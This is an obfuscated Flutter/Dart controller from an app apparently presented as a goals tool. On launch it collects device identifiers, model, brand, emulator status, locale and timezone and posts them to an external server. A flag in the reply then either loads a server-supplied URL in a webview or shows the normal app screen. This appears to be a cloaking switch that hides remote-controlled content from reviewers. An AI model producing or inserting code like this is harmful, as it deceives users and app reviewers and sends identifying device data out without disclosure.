import 'dart:io';
import 'package:flutter/services.dart';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:dio/dio.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'package:device_info_plus/device_info_plus.dart';


class GoalsFocusLogic extends GetxController {

  var urpbaxw = RxBool(false);
  var fqgvesn = RxBool(true);
  var xqbywo = RxString("");
  var filomena = RxBool(false);
  var larson = RxBool(true);
  final prjgdqz = Dio();


  InAppWebViewController? webViewController;

  dynamic vraeplqdjo(){
    final xkwibgz = InternetConnectionChecker.instance;
    final qrfpilvxhd = xkwibgz.onStatusChange.skip(1).listen(
          (InternetConnectionStatus dkuhtb) {
        if (dkuhtb == InternetConnectionStatus.connected) {
          vgiqycke();
        } else {
          Get.toNamed('/goals_break')?.then((_){
            vgiqycke();
          });
        }
      },
    );
    return qrfpilvxhd;
  }

  Future<bool> dufxmkqit() async {
    var jmnrptyzq = await InternetConnectionChecker.instance.hasConnection;
    if(!jmnrptyzq){
      Get.toNamed('/goals_break')?.then((_){
        vgiqycke();
      });
    }
    return jmnrptyzq;
  }

  @override
  void onInit() {
    super.onInit();
    vraeplqdjo();
    vgiqycke();
  }


  Future<void> vgiqycke() async {

    var exnido = await dufxmkqit();
    if(!exnido){
      return;
    }

    filomena.value = true;
    larson.value = true;
    fqgvesn.value = false;

    prjgdqz.post("https://get.k3coded.com/uditeanozsgwvprqyjhmk",data: await drtenvwmf()).then((value) {
      var jxgr = value.data["jxgr"] as String;
      var klmdtihg = value.data["klmdtihg"] as bool;
      if (klmdtihg) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        xqbywo.value = jxgr;
        sedrick();
      } else {
        macejkovic();
      }
    }).catchError((e) {
      fqgvesn.value = true;
      larson.value = true;
      filomena.value = false;
    });
  }

  Future<Map<String, dynamic>> drtenvwmf() async {
    final DeviceInfoPlugin bevmr = DeviceInfoPlugin();
    PackageInfo zpmn_wpci = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dmnrfk = Platform.localeName;
    var znpqtim = currentTimeZone;

    var tsadki = zpmn_wpci.packageName;
    var doyzwrsn = zpmn_wpci.version;
    var kupq = zpmn_wpci.buildNumber;

    var vafzqwtp = zpmn_wpci.appName;
    var sjpekugh = "";
    var zcbak  = "";
    var axrmed = "";
    var lennieCole = "";
    var tyreeNikolaus = "";
    var nelleLubowitz = "";
    var lucileWalter = "";


    var jkbcvf = "";
    var ertpgj = false;

    if (GetPlatform.isAndroid) {
      jkbcvf = "android";
      var gyfzevc = await bevmr.androidInfo;

      axrmed = gyfzevc.brand;

      sjpekugh  = gyfzevc.model;
      zcbak = gyfzevc.id;

      ertpgj = gyfzevc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jkbcvf = "ios";
      var ersyalkdhj = await bevmr.iosInfo;
      axrmed = ersyalkdhj.name;
      sjpekugh = ersyalkdhj.model;

      zcbak = ersyalkdhj.identifierForVendor ?? "";
      ertpgj  = ersyalkdhj.isPhysicalDevice;
    }
    var res = {
      "vafzqwtp": vafzqwtp,
      "doyzwrsn": doyzwrsn,
      "tsadki": tsadki,
      "sjpekugh": sjpekugh,
      "nelleLubowitz" : nelleLubowitz,
      "znpqtim": znpqtim,
      "lennieCole" : lennieCole,
      "axrmed": axrmed,
      "zcbak": zcbak,
      "dmnrfk": dmnrfk,
      "kupq": kupq,
      "ertpgj": ertpgj,
      "tyreeNikolaus" : tyreeNikolaus,
      "lucileWalter" : lucileWalter,
      "jkbcvf": jkbcvf,

    };
    return res;
  }

  Future<void> macejkovic() async {
    Get.offNamed("/goals_main");
  }

  Future<void> sedrick() async {
    Get.offNamed("/goals_zp");
  }

  @override
  void dispose() {
    vraeplqdjo().cancel();
    super.dispose();
  }

}
